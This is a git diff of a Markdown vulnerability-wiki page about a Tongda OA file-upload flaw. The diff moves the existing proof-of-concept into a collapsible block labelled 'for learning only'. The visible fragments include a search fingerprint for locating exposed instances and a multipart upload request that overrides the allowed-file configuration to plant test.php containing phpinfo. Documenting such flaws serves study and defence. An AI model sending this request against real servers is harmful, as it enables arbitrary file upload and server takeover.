@@ -25,8 +25,10 @@ tags:
 
 ```
 app="TDXK-通达OA" 
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
 访问获取版本信息
@@ -64,13 +66,14 @@ Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
 Content-Disposition: form-data; name="ffff"; filename="test.php"
 Content-Type: application/octet-stream
 
-<?php phpinfo();?>
+&lt;?php phpinfo();?&gt;
 -----------------------------55719851240137822763221368724
 Content-Disposition: form-data; name="mufile"
 
 submit
------------------------------55719851240137822763221368724--
-```
+-----------------------------55719851240137822763221368724--</code></pre>
+
+</details>
 
 ![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091053293.png)
 
